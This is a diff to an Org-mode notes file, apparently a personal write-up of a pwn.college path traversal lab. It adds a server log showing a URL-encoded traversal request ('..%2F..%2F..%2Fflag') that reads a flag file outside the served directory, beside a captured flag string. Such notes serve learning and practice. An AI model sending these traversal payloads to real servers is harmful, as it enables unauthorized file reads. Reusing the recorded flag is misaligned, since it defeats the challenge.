@@ -1,3 +1,5 @@
+#+OPTIONS: d:nil
+
 * TODO Path Traversal 1
 #+NAME: server
 #+begin_src python
@@ -41,6 +43,11 @@ CLOSED: [2026-06-09 火 23:32]
 
   #+begin_example
   pwn.college{kKM0dpmyBsNbIWN2_DdICoYE9yq.dJjN1YDL2AjNyMzW}
+  #+end_example
+
+  #+begin_example
+  DEBUG: requested_path='/challenge/files/fortunes/../../../flag'
+  127.0.0.1 - - [09/Jun/2026 14:31:01] "GET /serve/fortunes/..%2F..%2F..%2Fflag HTTP/1.1" 200 -
   #+end_example
 - Note taken on [2026-06-09 火 22:18] \\
   おしい？
